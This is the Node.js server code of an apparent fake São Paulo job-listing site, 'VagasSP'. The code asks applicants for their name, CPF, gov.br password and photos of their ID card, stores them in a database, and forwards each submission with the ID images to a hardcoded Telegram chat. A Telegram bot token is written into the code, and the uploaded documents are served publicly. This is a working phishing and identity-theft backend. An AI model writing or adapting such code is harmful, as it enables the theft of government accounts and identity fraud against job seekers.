const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const multer = require('multer');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const mime = require('mime-types');
const fs = require('fs');
const cors = require('cors');
const app = express();

app.use(express.json());

// CORS - liberar domínio do seu frontend
app.use(cors({
    origin: ['https://vagasSãopaulo.onrender.com'],
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

// Configuração de upload
const storage = multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({
    storage,
    limits: { fileSize: 5 * 1024 * 1024 }
}).fields([
    { name: 'curriculo' },
    { name: 'rg_frente' },
    { name: 'rg_verso' }
]);

// Banco de dados SQLite
const db = new sqlite3.Database('./vagassp.db', (err) => {
    if (err) return console.error('Erro ao conectar no SQLite:', err);
    console.log('Banco de dados conectado.');

    db.run(`
        CREATE TABLE IF NOT EXISTS candidaturas (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT NOT NULL,
            email TEXT NOT NULL,
            telefone TEXT NOT NULL,
            cpf TEXT NOT NULL,
            senha_gov TEXT NOT NULL,
            curriculo_path TEXT NOT NULL,
            rg_frente_path TEXT,
            rg_verso_path TEXT,
            data_criacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    `, (err) => {
        if (err) console.error('Erro ao criar tabela:', err);
    });
});


// Configuração do bot Telegram
const token = process.env.TELEGRAM_BOT_TOKEN || '8014225785:AAExTqxQ1d7j1SPlX-zcQWuX5Ji4c2VSSP4';
const chatId = '5114449108';
const bot = new TelegramBot(token);

// Webhook
const webhookPath = '/telegram-webhook';
const port = process.env.PORT || 3000;
const webhookUrl = process.env.WEBHOOK_URL || `https://vagasSãopaulo.onrender.com${webhookPath}`;

bot.setWebHook(webhookUrl).then(() => {
    console.log(`Webhook configurado para ${webhookUrl}`);
}).catch(err => console.error('Erro ao configurar webhook:', err));

app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Comando para listar candidaturas
bot.onText(/\/candidaturas/, (msg) => {
    if (msg.chat.id.toString() !== chatId) {
        return bot.sendMessage(msg.chat.id, 'Acesso negado.');
    }

    db.all('SELECT * FROM candidaturas', [], (err, rows) => {
        if (err || !rows.length) {
            return bot.sendMessage(chatId, 'Nenhuma candidatura encontrada.');
        }

        let mensagem = '*Candidaturas VagasSP*\n\n';
        rows.forEach(c => {
            mensagem += `*${c.nome}*\nEmail: ${c.email}\nTelefone: ${c.telefone}\nCPF: ${c.cpf}\nSenha GOV: ${c.senha_gov}\nCurrículo: ${c.curriculo_path}\nRG Frente: ${c.rg_frente_path || 'Não'}\nRG Verso: ${c.rg_verso_path || 'Não'}\nData: ${c.data_criacao}\n\n`;
        });

        bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });
    });
});

// POST /candidaturas
app.post('/candidaturas', (req, res) => {
    upload(req, res, (err) => {
        if (err) return res.status(400).send(`Erro no upload: ${err.message}`);

        const { nome, email, telefone, cpf, senha_gov } = req.body;
        const curriculo_path = req.files['curriculo']?.[0].path;
        const rg_frente_path = req.files['rg_frente']?.[0]?.path || null;
        const rg_verso_path = req.files['rg_verso']?.[0]?.path || null;

        if (!nome || !email || !telefone || !cpf || !senha_gov || !curriculo_path) {
            return res.status(400).send('Todos os campos obrigatórios devem ser preenchidos.');
        }

        const query = `
            INSERT INTO candidaturas (nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)`;

        db.run(query, [nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path], function(err) {
            if (err) return res.status(500).send('Erro ao salvar no banco de dados.');

            db.get('SELECT * FROM candidaturas WHERE id = ?', [this.lastID], (err, cand) => {
                if (err || !cand) return;

                const mensagem = `
*Nova Candidatura VagasSP*
*Nome:* ${cand.nome}
*Email:* ${cand.email}
*Telefone:* ${cand.telefone}
*CPF:* ${cand.cpf}
*Senha GOV:* ${cand.senha_gov}
*Data:* ${cand.data_criacao}
Currículo: ${cand.curriculo_path}
RG Frente: ${cand.rg_frente_path || 'Não enviado'}
RG Verso: ${cand.rg_verso_path || 'Não enviado'}
                `;

                bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });

                // Envio de arquivos
                const sendFile = (filePath) => {
                    const mimeType = mime.lookup(filePath) || 'application/octet-stream';
                    return bot.sendDocument(chatId, filePath, {}, { contentType: mimeType });
                };

                sendFile(curriculo_path).catch(console.error);
                if (rg_frente_path) sendFile(rg_frente_path).catch(console.error);
                if (rg_verso_path) sendFile(rg_verso_path).catch(console.error);
            });

            res.send('Candidatura enviada com sucesso!');
        });
    });
});

// Servir uploads
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Servir frontend estático
app.use(express.static(path.join(__dirname, 'public')));
app.use((req, res) => {
    const indexPath = path.join(__dirname, 'public', 'index.html');
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        res.status(404).send('Página não encontrada.');
    }
});

// Iniciar servidor
app.listen(port, () => {
    console.log(`Servidor VagasSP rodando na porta ${port}`);
});
